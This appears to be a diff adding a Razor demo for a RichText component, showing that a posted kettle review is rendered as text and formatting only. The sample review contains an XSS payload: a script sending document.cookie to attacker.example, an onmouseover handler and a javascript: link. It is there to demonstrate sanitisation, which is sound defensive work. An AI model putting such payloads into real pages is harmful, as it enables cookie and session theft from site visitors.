@@ -1,0 +1,15 @@
+@* A product review as it was posted, with a script, an event handler, inline styles and a
+   javascript: link in it. Only the text and its formatting are shown. *@
+<RichText Html="@review" MaxWidth="Length.Prose" Grow />
+
+@* hide *@
+@code {
+    private const string review =
+        """
+        <h1 style="color:red;font-size:48px">Great kettle</h1>
+        <p onmouseover="steal()">Boils in <b>under two minutes</b> and the lid <i>doesn't</i> drip.</p>
+        <script>fetch('https://attacker.example/?c=' + document.cookie)</script>
+        <p>See <a href="javascript:steal()">my other reviews</a>.</p>
+        """;
+}
+@* /hide *@
